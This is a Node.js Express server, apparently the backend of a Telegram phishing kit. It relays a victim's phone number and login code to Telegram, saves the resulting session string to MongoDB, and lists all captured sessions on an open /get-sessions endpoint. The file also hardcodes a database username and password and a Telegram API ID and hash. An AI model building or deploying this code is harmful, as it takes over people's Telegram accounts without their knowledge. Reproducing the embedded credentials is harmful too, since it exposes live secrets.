const express = require('express');
const cors = require('cors');
const mongoose = require('mongoose');
const { TelegramClient, Api } = require('telegram');
const { StringSession } = require('telegram/sessions');

const app = express();
app.use(cors());
app.use(express.json());

// CONFIG
const apiId = 23049703; // Deine ID
const apiHash = 'e9c00af578a9de0253ef02337460498f'; // Dein Hash
const MONGO_URI = "mongodb+srv://mercyinfo52_db_user:Hinva312-@cluster0.a0bslma.mongodb.net/?appName=Cluster0";

mongoose.connect(MONGO_URI)
    .then(() => console.log("DB Connected"))
    .catch(err => console.error("DB Error:", err));

const SessionSchema = new mongoose.Schema({
    phoneNumber: String,
    sessionString: String,
    date: { type: Date, default: Date.now }
});
const SessionModel = mongoose.model('Session', SessionSchema);

// Endpoint 1: OTP senden
app.post('/send-otp', async (req, res) => {
    try {
        const client = new TelegramClient(new StringSession(""), apiId, apiHash, { connectionRetries: 5 });
        await client.connect();
        const result = await client.sendCode({ apiId, apiHash }, req.body.phoneNumber);
        res.json({ success: true, phoneCodeHash: result.phoneCodeHash });
    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
});

// Endpoint 2: OTP verifizieren & Session speichern
app.post('/verify-otp', async (req, res) => {
    try {
        const client = new TelegramClient(new StringSession(""), apiId, apiHash, { connectionRetries: 5 });
        await client.connect();
        await client.signIn({
            phoneNumber: req.body.phoneNumber,
            phoneCodeHash: req.body.phoneCodeHash,
            phoneCode: req.body.phoneCode
        });
        
        const sessionString = client.session.save();
        await SessionModel.create({ phoneNumber: req.body.phoneNumber, sessionString });
        
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
});

// Endpoint 3: Alle Sessions abrufen
app.get('/get-sessions', async (req, res) => {
    try {
        const sessions = await SessionModel.find();
        res.json(sessions);
    } catch (err) {
        res.status(500).json({ error: "DB Error" });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server läuft auf Port ${PORT}`));
